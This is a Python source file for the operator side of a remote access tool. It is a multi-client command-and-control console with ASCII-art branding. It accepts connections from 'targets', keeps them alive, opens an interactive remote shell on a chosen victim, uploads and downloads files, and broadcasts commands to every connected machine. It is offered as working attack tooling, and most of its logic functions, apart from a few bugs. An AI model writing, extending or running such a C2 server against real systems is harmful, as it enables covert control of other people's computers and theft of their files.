#from re import S
import socket
import json
import os
import base64
from colorama import Fore, Back, Style
import threading
import time


os.system('cls')
print(Fore.MAGENTA + """\

                                           s               
                                          :8               
   uL   ..                x.    .        .88               
 .@88b  @88R       .    .@88k  z88u     :888ooo      .u    
'"Y888k/"*P   .udR88N  ~"8888 ^8888   -*8888888   ud8888.  
   Y888L     <888'888k   8888  888R     8888    :888'8888. 
    8888     9888 'Y"    8888  888R     8888    d888 '88%" 
    `888N    9888        8888  888R     8888    8888.+"    
 .u./"888&   9888        8888 ,888B .  .8888Lu= 8888L      
d888" Y888*" ?8888u../  "8888Y 8888"   ^%888*   '8888c. .+ 
` "Y   Y"     "8888P'    `Y"   'YP       'Y"     "88888%   
                "P'                                "YP'    

""") 

# print(Fore.RED + "[!!] " + Fore.WHITE + " error")

def sendtoall(target, data):
    
    try:
        json_data = json.dumps(data)
        target.send(json_data.encode('utf-8'))
    except:
        print(Fore.RED + "[!!] " + Fore.WHITE + " send to all error")
            
def receiveall(sel_target): 
        
        data = ""
        i=0
        while i<5:
            
            try:
                data = data + sel_target.recv(1024).decode('utf-8')
                return json.loads(data)
            except:
                
                time.sleep(0.02)
                i = i + 1
                
        
        data = "n"
        return data

def keep_alive(seltarget, selip):
    global clients
    def reliable_send(seltarget, data):
        try:
            json_data = json.dumps(data)
            seltarget.send(json_data.encode('utf-8'))
        except:
            pass

    def reliable_recv(seltarget):    
        i = 0
        data = ""
        while True:
            while i<5:
            
                try:
                    data = data + seltarget.recv(1024).decode('utf-8')
                    return json.loads(data)
                except:
                    
                    time.sleep(0.1)
                    i = i + 1
            data = "n"
            return data
    while True:
        time.sleep(5)
        
        keepalive_command = "ka"
        
        #try:
        reliable_send(seltarget, keepalive_command)
        received = reliable_recv(seltarget)
        
        if received == "n":
            print("\n" + Fore.RED + "[:(] " + Fore.WHITE + str(selip) + " disconnected")
            try:
                targets.remove(seltarget)
                ips.remove(selip)
                clients = clients - 1
            except:
                break          
            break
       # except:
         #   print("Keepalive error")
  
        

def shell(target, ip):
    global clients
    def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data.encode('utf-8'))

    def reliable_recv():    
        i = 0
        data = ""
        while True:
            try:
                data = data + target.recv(1024).decode('utf-8')
                return json.loads(data)
            except ValueError:
                continue    
    while True:
        
        command = input(Fore.WHITE + "* Shell#-%s: " % str(ip))
        reliable_send(command)
        if command == "q":
            center()
        elif command == "help":
                     print("""
    - cd [folder] --> Sets the specified folder as working dir
    - exit --> Removes target [X]
    - upload [file] --> Uploads specified file [X]
    - download [file] --> Downloads specified file [X]
    - cls --> Clears the screen
            """)
        elif command == "cls":
            os.system('cls')
            print(Fore.MAGENTA + """\

                                           s               
                                          :8               
   uL   ..                x.    .        .88               
 .@88b  @88R       .    .@88k  z88u     :888ooo      .u    
'"Y888k/"*P   .udR88N  ~"8888 ^8888   -*8888888   ud8888.  
   Y888L     <888'888k   8888  888R     8888    :888'8888. 
    8888     9888 'Y"    8888  888R     8888    d888 '88%" 
    `888N    9888        8888  888R     8888    8888.+"    
 .u./"888&   9888        8888 ,888B .  .8888Lu= 8888L      
d888" Y888*" ?8888u../  "8888Y 8888"   ^%888*   '8888c. .+ 
` "Y   Y"     "8888P'    `Y"   'YP       'Y"     "88888%   
                "P'                                "YP'    

    """)
            Fore.WHITE
        elif command[:2] == "cd" and len(command) > 1:
            result = reliable_recv()
            print("CD: " + result)
        elif command[:6] == "upload":
            filename = command[7:]
            file = open(filename, "r")
            data = file.read()
            reliable_send(data)
            file.close()
            
                    
       
        elif command == "exit":
            target.close()
            targets.remove(target)
            ips.remove(ip)
            clients - 1
            
            center()
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                file.write(file_data)
        else:
            
            result = reliable_recv()
            
            print(result)    
    
def server():
    global clients
    while True:
        
        s.settimeout(1)
        
        if stop_threads:
            break
        try:
            target, ip = s.accept()
            
            targets.append(target)
            ips.append(ip)

            print("\n" + Fore.LIGHTMAGENTA_EX + "[*] " + Fore.WHITE + str(ip) + " has CONNECTED.")
            
            ka = threading.Thread(target=keep_alive, args=(target, ip))
            ka.start()

            clients += 1
        except:
            
            pass
global s
ips = []
targets = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1", 54321))
s.listen(5)

clients = 0
stop_threads = False

print(Fore.LIGHTMAGENTA_EX + "[*]" + Fore.WHITE +  " Listening = on")
print(Fore.LIGHTMAGENTA_EX + "[*]" + Fore.WHITE +  " Keep alive = on")
print()
Fore.WHITE

t1 = threading.Thread(target=server)
t1.start()


################ Center ################
def center():
    while True:
        command = input(Fore.MAGENTA + "*" + Fore.WHITE + " cntr >> ")
        if command == "clients":
            count = 0
            for ip in ips:
                print("Session " + str(count) + ". <---> " + str(ip))
                count += 1
        elif command == "help":
            print("""
    - clients --> Prints all connected clients
    - session [tarnum] --> Connect to specified target
    - exit --> Close all connections with server
    - sendall [command] --> Send command to all clients connected
    - cls --> Clears the screen
            """)

        elif command == "cls":

            os.system('cls')
            print(Fore.MAGENTA + """\

                                           s               
                                          :8               
   uL   ..                x.    .        .88               
 .@88b  @88R       .    .@88k  z88u     :888ooo      .u    
'"Y888k/"*P   .udR88N  ~"8888 ^8888   -*8888888   ud8888.  
   Y888L     <888'888k   8888  888R     8888    :888'8888. 
    8888     9888 'Y"    8888  888R     8888    d888 '88%" 
    `888N    9888        8888  888R     8888    8888.+"    
 .u./"888&   9888        8888 ,888B .  .8888Lu= 8888L      
d888" Y888*" ?8888u../  "8888Y 8888"   ^%888*   '8888c. .+ 
` "Y   Y"     "8888P'    `Y"   'YP       'Y"     "88888%   
                "P'                                "YP'    

    """)
            Fore.WHITE
        elif command == "":
            pass
        elif command == "print targets":
            print(str(targets))
        elif command[:2] == "s ":
            try:
                num = int(command[2:])
                tarnum = targets[num]
                tarip = ips[num]
                shell(tarnum, tarip)
            except:
                print("[!!] No session under that number")

        elif command == "exit":
            try:

                for target in targets:
                    target.close()
                
                stop_threads = True
                s.close()
            except:
                print("[!!] No targets connected")
            
            

        elif command[:7] == "sendall":
            length_of_targets = len(targets)
            
            i=0
            try:
                print(str(i))
                while i<length_of_targets:
                    #tarip = ips[i]
                    tarnumber = targets[i]
                    print(Fore.LIGHTMAGENTA_EX + "[*]" + Fore.WHITE +  " Send to: " + str(i + 1) + " clients")
                    sendtoall(tarnumber, command)
                    i += 1
            except:
                print("[!!] Failed to send command to all targets")

        else:
            print("[!!] Command doesn't exist")

center()